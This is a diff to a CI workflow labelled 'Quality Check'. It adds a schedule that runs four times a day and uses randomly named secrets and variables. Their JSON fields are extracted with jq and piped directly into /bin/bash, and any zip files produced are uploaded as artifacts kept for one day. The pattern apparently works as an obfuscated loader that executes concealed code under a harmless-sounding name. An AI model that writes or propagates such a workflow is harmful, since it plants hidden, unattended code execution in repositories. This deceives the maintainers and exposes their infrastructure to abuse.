@@ -2,6 +2,8 @@ name: Quality Check
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '46 0,6,12,18 * * *'
 permissions:
   contents: read
   actions: read
@@ -14,15 +16,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run pipeline
         env:
-          rqpc000: ${{ secrets.rqpc000 }}
+          zhxk6: ${{ secrets.zhxk6 }}
         run: |
-          printf '%s' "$rqpc000" | jq -r .p14 | /bin/bash
-          printf '%s' "$ji343" | jq -r .oumpo54 | /bin/bash
-          echo $cuym49 | jq -r .k20 | /bin/bash
+          printf '%s' "$zhxk6" | jq -r .e6230 | /bin/bash
+          echo $h330 | jq -r .j026 | /bin/bash
+          echo $yro84 | jq -r .a08842 | /bin/bash
+          echo $hpg2 | jq -r .ajiur11 | /bin/bash
+          echo $obus1 | jq -r .q680 | /bin/bash
+          echo $sf64 | jq -r .b3 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
         with:
-          name: YNHwvh28
+          name: Fahfb7Yq
           path: "*.zip"
           retention-days: 1
